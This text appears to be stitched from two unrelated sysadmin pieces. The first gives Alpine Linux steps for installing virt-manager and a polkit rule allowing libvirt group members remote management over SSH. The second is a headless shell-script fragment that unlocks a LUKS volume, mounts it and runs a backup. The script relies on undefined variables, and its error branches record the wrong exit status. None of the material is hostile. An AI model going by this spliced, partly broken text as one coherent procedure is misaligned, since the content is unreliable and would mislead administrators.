The libvirt project provides a GUI for managing hosts, called virt-manager. It handles local systems as well as remote ones via SSH.

# apk add dbus polkit virt-manager terminus-font
# rc-update add dbus

In order to use libvirtd to remotely control KVM over ssh PolicyKit needs a .pkla informing it that this is allowed. Write the following file to /etc/polkit-1/localauthority/50-local.d/50-libvirt-ssh-remote-access-policy.pkla

[Remote libvirt SSH access]
 Identity=unix-group:libvirt
 Action=org.libvirt.unix.manage
 ResultAny=yes
 ResultInactive=yes
 ResultActive=yes









# Build the reference to the volume.
volume="/dev/disk/by-uuid/$UUID"

# Create a unique name for the LUKS mapping.
name="crypt-$UUID"

# Set the default exit code.
exitcode=$EX_OK

# Continue if the volume exists.
if [ -e $volume ];
then
    # Attempt to open the LUKS volume, using keyfile if given.
    if [ "$KEYFILE" = "" ]; then
        cryptsetup luksOpen $volume $name
    else
        cryptsetup luksOpen --key-file $KEYFILE $volume $name
    fi
    # If the volume was decrypted, mount it. 
    if [ $? -eq 0 ];
    then
        mount /dev/mapper/$name $MOUNTPOINT
        # If the volume was mounted, run the backup.
        if [ $? -eq 0 ];
        then
            $BACKUP $BACKUP_ARGS
            # Unmount the volume
            umount $MOUNTPOINT
            # If the volume was unmounted and the user has requested that the
            # mount point be removed, remove it.
            if [ $? -eq 0 ] && [ $REMOVEMOUNT -ne 0 ] && [ -d $MOUNTPOINT ]; then
                rmdir $MOUNTPOINT
            fi
        else
            exitcode=$?
            echo "Failed to mount $volume at $MOUNTPOINT."
        fi
        # Close the LUKS volume.
        cryptsetup luksClose $name
    else
        exitcode=$?
        echo "Failed to open $volume with key $KEYFILE."
    fi
else
    exitcode=$EX_NOINPUT
    echo "Volume $UUID not found."
fi

exit $exitcode
